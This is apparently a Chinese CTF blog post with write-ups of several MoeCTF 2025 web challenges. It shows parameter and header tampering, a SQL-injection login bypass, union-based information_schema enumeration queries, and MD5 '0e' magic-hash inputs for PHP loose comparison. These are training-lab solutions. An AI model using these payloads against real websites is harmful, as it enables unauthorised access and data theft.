---
title: day6
published: 2025-10-22
description: "一些题目+ ZAP工具的使用 + SQL 相关"
tags: ["ctf", "web", "python"]
category: ctf
draft: false
---

## MeoCTF 题目 [03 第三章 问剑石！篡天改命！](https://ctf.xidian.edu.cn/training/22?challenge=882)
### 标签: MoeCTF2025 Web Web安全与渗透测试
进入题干给的靶机地址发现API: **/test_talent** 这个是服务器提交和获取flag的关键
同时查看代码
```javascript
        async function testTalent() {
            try {
                const response = await fetch('/test_talent?level=B', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ manifestation: 'none' })
                });
                
                const data = await response.json();
                document.getElementById('result').textContent = data.result;
                
                // 显示/隐藏光芒效果
                const glow = document.getElementById('glow');
                if (data.result.includes('流云状青芒')) {
                    glow.style.opacity = '1';
                } else {
                    glow.style.opacity = '0';
                }
                
                if (data.flag) {
                    setTimeout(() => {
                        alert(`✨ 天道机缘：${data.flag} ✨\n\n天赋篡天术大成！`);
                    }, 500);
                }
            } catch (error) {
                alert('玄轨连接中断！请检查灵枢...');
            }
        }
```

发现只要修改 这个fetch发出的 **GET** 参数为 **leve=S**， **POST**参数为 **flowing_azure_clouds** 即可获得flag
于是使用ZAP 抓包并修改发出的消息得到
```json
{"flag":"moectf{get-posT_tr4N5mISsI0n-ls-a-Go0D-METhoDl!la7}","result":"\u5929\u8d4b\uff1aS\uff0c\u5149\u8292\uff1a\u6d41\u4e91\u72b6\u9752\u8292","status":"\u5929\u9053\u7be1\u6539\u6210\u529f\uff01"}
```

## MeoCTF 题目 [04 第四章 金曦破禁与七绝傀儡阵](https://ctf.xidian.edu.cn/training/22?challenge=884&tab=terminal)
### 标签: MoeCTF2025 Web Web安全与渗透测试
进入后发现需要使用GET方法传递参数 key=xdsec 获得
```txt
bW9lY3Rme0Mw
```
后提供下一阶段的网址，进入后发现需要使用POST方法请求数据：declaration=织云阁=第一，不过显然这个不能直接发送需要经过url编码
将**织云阁=第一** url 编码后得到
```txt
%E7%BB%87%E4%BA%91%E9%98%81%3D%E7%AC%AC%E4%B8%80
```
获得
```txt
bjZyNDd1MTQ3
```
后发现下一阶段的路由，要求使用本地访问,故往请求头添加 X-Forwarded-For: 127.0.0.1
得到下一阶段路由和线索
```txt
MTBuNV95MHVy
```

进入下一阶段的路由要求使用 moe browser 访问,故修改请求头 User-Agent: 参数为**moe browser**
得到下一阶段的路由和线索
```txt
X2g3N1BfbDN2

```
进入下一阶段的路由发现 需要以xt的身份认证user! 说明是使用Cookie 故添加**Cookie: user=xt**
获得下一阶段路由和线索
```
M2xfMTVfcjM0
```

进入下一阶段发现 要求我们从指定的地址**http://panshi/entry** 跳转过来,故修改
获得下一阶段的路由和线索
```txt
bGx5X2gxOWgh
```


进入下一阶段的发现， 要求我们从指定地址中要求使用 PUT 方法，获取最后一段线索
```txt
fQ==
```

将所有信息拼合发现这是一段BASE64编码
bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==
解码得: moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}


## MeoCTF 题目 [05 第五章 打上门来](https://ctf.xidian.edu.cn/training/22?challenge=885)
### 标签: MoeCTF2025 Web Web安全与渗透测试

进入靶机后发现这是一个文件查询系统发现可以直接输入 **/flag** 进入根目录 发现flag文件
moectf{A11_lNpUt-Is_M@Ilc10uS6cdaec74}


## MeoCTF 题目 [06 第六章 藏经禁制？玄机初探！](https://ctf.xidian.edu.cn/training/22?challenge=886&tab=terminal)\
### 标签: MoeCTF2025 Web Web安全与渗透测试
进入题目后发现是一个登陆界面，可以猜测是要求进行SQL注入故尝试输入
```txt
1' OR 1=1 #
```
果然获得flag：moectf{w3LcOm3_TO_sql-lnjeCtl0nl11a99967b}

## MeoCTF 题目 [07 第七章 灵蛛探穴与阴阳双生符](https://ctf.xidian.edu.cn/training/22?challenge=887)
### 标签: MoeCTF2025 Web Web安全与渗透测试
根据题干说明，可知要求获取该靶机网站的根目录 robot.txt
请求发现 信息信息 **/flag.php**
```php

<?php
highlight_file(__FILE__);
$flag = getenv('FLAG');

$a = $_GET["a"] ?? "";
$b = $_GET["b"] ?? "";

if($a == $b){
    die("error 1");
}

if(md5($a) != md5($b)){
    die("error 2");
}

echo $flag;
```

使用数组绕过发现不可行，于是使用0e绕过，输入:
```txt
http://127.0.0.1:57562/flag.php?a=240610708&b=QNKCDZO
```

得到 flag：moectf{MD5-lS-NOT-5afE111713b01866a}

#### note:
  常用的0e绕过MD5字符串
```txt
字符串：240610708
MD5: 0e462097431906509019562988736854

字符串：QNKCDZO
MD5: 0e830400451993494058024219903391
```


## MeoCTF 题目 [08 第八章 天衍真言，星图显圣](https://ctf.xidian.edu.cn/training/22?challenge=889&tab=terminal)
### 标签: MoeCTF2025 Web Web安全与渗透测试
依旧是SQL注入 完成后获得flag：moectf{uNIon-B@seD-sQ1i-ftwl!11e1b05e9}


#### note 常用SQL 代码
```txt
SELECT 1, 2, ...  # 查询列数
select table_name,列数 from information_schema.tables where table_schema=database() # 查询系统表 列出该数据库的所有表
select column_name,列数 from information_schema.columns where table_name='TableName'  # 查询名为TableName的表 查看他的所有列名
select 列名,列数 from TableName # 从TableName 中查找对应的值

```

## MeoCTF 题目 [Moe笑传之猜猜爆](https://ctf.xidian.edu.cn/training/22?challenge=908)
### 标签: MoeCTF2025 Web
F12 查看源码发现 判断猜数的JS 并没有做混淆 直接使用**覆盖** 修改其中的猜中判断方法 **checkGuess()**
获得flag: moectf{b38b9fc5-2703-e415-6fed-676213dc04bc}
